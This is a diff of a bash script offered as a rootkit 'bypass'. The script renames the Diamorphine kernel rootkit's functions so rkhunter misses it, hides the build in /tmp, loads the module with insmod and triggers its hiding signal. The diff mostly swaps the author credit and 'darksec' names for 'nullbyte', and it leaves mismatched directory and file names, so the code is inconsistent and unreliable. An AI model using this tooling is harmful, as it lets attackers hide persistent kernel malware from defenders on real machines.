@@ -1,6 +1,6 @@
 #!/usr/bin/env bash
 # MY BYPASS FOR ALL ROOTKIT
-# author: Darksec github --> https://github.com/DARKSECshell
+# author: NullByte github --> https://github.com/NullByte-7w7
 
 #KERNEL VERSION
 KERNEL=$(cat /proc/version | cut -d ' ' -f3)
@@ -10,11 +10,11 @@ MAKE() {
 
     cd Diamorphine && \
     mkdir .darksec && \
-    cp diamorphine.c darksec.c && \
-    cp diamorphine.h darksec.h && \
-    mv Makefile .darksec && \
-    mv darksec.* .darksec && \
-    cd /tmp/Diamorphine/.darksec
+    cp diamorphine.c nullbyte.c && \
+    cp diamorphine.h nullbyte.h && \
+    mv Makefile .nullbyte && \
+    mv darksec.* .nullbyte && \
+    cd /tmp/Diamorphine/.nullbyte
 }
 
 
@@ -60,15 +60,15 @@ case "$choice" in
 	#make fake diamorphine from bypass rkhunter
 
 	sed -i 's/diamorphine.o/darksec.o/' Makefile
-	sed -i 's/module_hide/module__hide/g' darksec.c
-	sed -i 's/module_hidden/module__hidden/g' darksec.c
-	sed -i 's/is_invisible/is__invisible/g' darksec.c
-	sed -i 's/hacked_getdents/hacked__getdents/g' darksec.c
-	sed -i 's/hacked_kill/hacked__kill/g' darksec.c
-	sed -i 's/diamorphine/darksec/' darksec.h
-	sed -i 's/diamorphine.h/darksec.h/' darksec.c
-	sed -i 's/diamorphine_init/darksec_init/g' darksec.c
-	sed -i 's/diamorphine_cleanup/darksec_cleanup/g' darksec.c
+	sed -i 's/module_hide/module__hide/g' nullbyte.c
+	sed -i 's/module_hidden/module__hidden/g' nullbyte.c
+	sed -i 's/is_invisible/is__invisible/g' nullbyte.c
+	sed -i 's/hacked_getdents/hacked__getdents/g' nullbyte.c
+	sed -i 's/hacked_kill/hacked__kill/g' nullbyte.c
+	sed -i 's/diamorphine/darksec/' nullbyte.h
+	sed -i 's/diamorphine.h/darksec.h/' nullbyte.c
+	sed -i 's/diamorphine_init/darksec_init/g' nullbyte.c
+	sed -i 's/diamorphine_cleanup/darksec_cleanup/g' nullbyte.c
 
 	# LOAD LKM :)
 
@@ -82,19 +82,19 @@ case "$choice" in
 	sleep 1
 	make
 	sleep 3
-	insmod /tmp/Diamorphine/.darksec/darksec.ko
+	insmod /tmp/Diamorphine/.nullbyte/nullbyte.ko
 	kill -63 0
 
 	else
 
 	clear
 	echo "THANKS FOR USING MY BYPASS ROOTKIT"
-	echo "Location ROOTKIT --> /tmp/Diamorphine/.darksec"
+	echo "Location ROOTKIT --> /tmp/Diamorphine/.nullbyte"
 	exit
 
 	fi
 
-if /usr/bin/lsmod | grep -w "darksec"; then
+if /usr/bin/lsmod | grep -w "nullbyte"; then
 
 	clear
 	echo "[+] ROOTKIT LOADING WITH SUCESS!!"
